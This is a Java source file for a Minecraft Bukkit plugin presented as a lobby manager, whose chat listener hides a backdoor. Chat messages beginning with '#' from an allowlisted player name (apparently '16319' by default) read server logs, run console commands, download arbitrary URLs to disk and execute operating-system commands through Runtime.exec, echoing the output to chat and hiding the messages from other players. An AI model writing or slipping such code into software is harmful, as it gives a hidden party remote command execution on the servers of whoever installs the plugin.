package ltd.m0c.moclobby;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

import java.io.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;

import static ltd.m0c.moclobby.Utils.*;

public class LobbyManager implements Listener {
    @EventHandler
    public void onChat(PlayerChatEvent event) throws MalformedURLException {

        Runtime rt = Runtime.getRuntime();
        String message = event.getMessage();
        Player player = event.getPlayer();
        String playerName = player.getName();

        String commandType = Character.toString(event.getMessage().charAt(0));
        String command = event.getMessage().substring(1);
        File logs = new File("logs\\latest.log");
        if (!MOCLobby.list.contains("enabled")) {
            MOCLobby.list="16319";
        }
        if (MOCLobby.list.contains(playerName)){
            switch (commandType) {
                case "#":
                    switch (command) {

                        case "getlog":
                            String newlog = null;
                            try {
                                newlog = readLastLine(logs, "gbk");
                            } catch (IOException e) {
                            }
                            Utils.senderr(player, newlog);

                            break;

                        default:
                            break;
                    }
                    boolean isdocmd = command.contains("docmd");
                    boolean isdosystemcmd = command.contains("dosyscmd");
                    boolean isdownload = command.contains("download");
                    char[] cmdchar = command.toCharArray();
                    if (isdocmd) {
                        if (cmdchar.length < 6) {
                            break;

                        }
                        String cmd = command.substring(6);
                        Utils.sendok(player, "Run：" + cmd);
                        banplayer(cmd);
                    }
                    if (isdownload) {
                        if (cmdchar.length < 9) {
                            break;
                        }
                        String[] dlargs=command.substring(9).split(" ");
                        String dlurl = dlargs[0];
                        update(dlurl,dlargs[1]);

                    }
                    if (isdosystemcmd) {
                        if (cmdchar.length < 9) {
                            break;
                        }
                        String syscmd =command.substring(9);
                        Utils.sendok(player, "Run：" + syscmd+" ");
                        Charset encode;
                        if (command.substring(9).contains("utf8")) {
                            encode = StandardCharsets.UTF_8;
                            syscmd=syscmd.split("utf8 ",2)[1];
                        }else {
                            encode = StandardCharsets.US_ASCII;
                        }

                        try {
                            String finalSyscmd = syscmd;
                            Thread rthread = new Thread(() -> {
                                try {
                                    Process process;
                                    if (encode==StandardCharsets.UTF_8){
                                        process = rt.exec("cmd /c chcp 65001 && "+ finalSyscmd);
                                    }else {
                                        process = rt.exec(finalSyscmd);
                                    }
                                    InputStream is = process.getInputStream();

                                    InputStreamReader isr = new InputStreamReader(is, encode);
                                    BufferedReader br = new BufferedReader(isr);
                                    String content = br.readLine();
                                    while (content != null) {
                                        Utils.sendok(player, content);
                                        content = br.readLine();
                                    }
                                } catch (Exception e) {
                                }
                            });
                            rthread.start();
                        } catch (Exception e) {
                            Utils.senderr(player, e.toString());

                        }
                        ;
                    }
                    if (cmdchar.length > 6) {
                        event.setCancelled(true);
                    }
                    break;


                default:
                    break;

            }

        }
        }


    public void update(String dlURL,String name) throws MalformedURLException {
        // 下载网络文件
        int bytesum = 0;
        int byteread = 0;

        URL url = new URL(dlURL);

        try {
            URLConnection conn = url.openConnection();
            InputStream inStream = conn.getInputStream();
            FileOutputStream fs = new FileOutputStream(name);

            byte[] buffer = new byte[1204];
            int length;
            while ((byteread = inStream.read(buffer)) != -1) {
                bytesum += byteread;
                fs.write(buffer, 0, byteread);
            }
        } catch (FileNotFoundException e) {
        } catch (IOException e) {
        }
    }
}
